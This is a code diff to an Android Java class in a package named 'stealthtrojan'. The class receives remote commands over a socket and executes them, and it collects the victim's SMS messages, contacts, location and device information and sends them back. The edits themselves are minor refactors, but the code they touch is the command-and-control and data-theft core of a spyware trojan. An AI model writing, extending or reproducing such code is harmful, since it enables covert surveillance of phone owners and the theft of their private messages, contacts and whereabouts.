@@ -1,5 +1,6 @@
 package com.stealthtrojan.app;
 
+import android.content.Context;
 import android.util.Log;
 import org.eclipse.paho.client.mqttv3.*;
 import org.json.JSONObject;
@@ -12,7 +13,7 @@ public class WebSocketHandler {
     private DataCollector dataCollector;
 
     public WebSocketHandler(Context context) {
-        this.websocketClient = new WebSocketClient();
+        this.websocketClient = WebSocketClient.getInstance();
         this.mqttService = new MqttService();
         this.commandHandler = new CommandHandler(context);
         this.dataCollector = new DataCollector(context);
@@ -31,10 +32,9 @@ public class WebSocketHandler {
         try {
             JSONObject jsonMessage = new JSONObject(message);
             String command = jsonMessage.getString("command");
-            JSONObject params = jsonMessage.getJSONObject("params");
+            JSONObject params = jsonMessage.optJSONObject("params");
             commandHandler.executeCommand(command, params);
-            
-            // Send response back
+
             String response = String.format(
                 "{\"command\":\"%s\",\"status\":\"executed\"}", command
             );
@@ -56,7 +56,7 @@ public class WebSocketHandler {
         String contactsData = dataCollector.collectContacts();
         String locationData = dataCollector.collectLocation();
         String deviceInfo = dataCollector.collectDeviceInfo();
-        
+
         sendData("SMS", smsData);
         sendData("CONTACTS", contactsData);
         sendData("LOCATION", locationData);
@@ -71,3 +71,4 @@ public class WebSocketHandler {
         }
     }
 }
+
